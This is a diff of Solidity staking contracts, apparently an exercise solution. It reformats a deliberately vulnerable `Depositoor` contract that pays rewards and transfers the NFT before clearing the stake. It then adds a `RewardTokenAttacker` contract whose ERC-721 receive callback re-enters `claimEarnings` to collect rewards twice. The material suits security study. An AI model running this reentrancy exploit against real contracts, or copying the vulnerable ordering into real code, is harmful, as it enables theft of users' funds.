@@ -71,27 +71,20 @@ contract Depositoor is IERC721Receiver {
     }
 
     function claimEarnings(uint256 _tokenId) public {
-        require(
-            stakes[msg.sender].tokenId == _tokenId && _tokenId != 0,
-            "not your NFT"
-        );
+        require(stakes[msg.sender].tokenId == _tokenId && _tokenId != 0, "not your NFT");
         payout(msg.sender);
         stakes[msg.sender].depositTime = block.timestamp;
     }
 
     function withdrawAndClaimEarnings(uint256 _tokenId) public {
-        require(
-            stakes[msg.sender].tokenId == _tokenId && _tokenId != 0,
-            "not your NFT"
-        );
+        require(stakes[msg.sender].tokenId == _tokenId && _tokenId != 0, "not your NFT");
         payout(msg.sender);
         nft.safeTransferFrom(address(this), msg.sender, _tokenId);
         delete stakes[msg.sender];
     }
 
     function payout(address _a) private {
-        uint256 amountToSend = (block.timestamp - stakes[_a].depositTime) *
-            REWARD_RATE;
+        uint256 amountToSend = (block.timestamp - stakes[_a].depositTime) * REWARD_RATE;
 
         if (amountToSend > 50e18) {
             amountToSend = 50e18;
@@ -101,5 +94,34 @@ contract Depositoor is IERC721Receiver {
         }
 
         rewardToken.transfer(_a, amountToSend);
+    }
+}
+
+contract RewardTokenAttacker is IERC721Receiver {
+    Depositoor depositor;
+    NftToStake nft;
+    RewardToken token;
+
+    function setup(Depositoor _depositor, NftToStake _nft, RewardToken _token) public {
+        depositor = _depositor;
+        nft = _nft;
+        token = _token;
+        nft.safeTransferFrom(address(this), address(depositor), 42);
+    }
+
+    function attack() public {
+        depositor.withdrawAndClaimEarnings(42);
+    }
+
+    function onERC721Received(
+        address,
+        address from,
+        uint256 tokenId,
+        bytes calldata
+    ) external override returns (bytes4) {
+        if (token.balanceOf(address(depositor)) > 0) {
+            depositor.claimEarnings(42);
+        }
+        return IERC721Receiver.onERC721Received.selector;
     }
 }
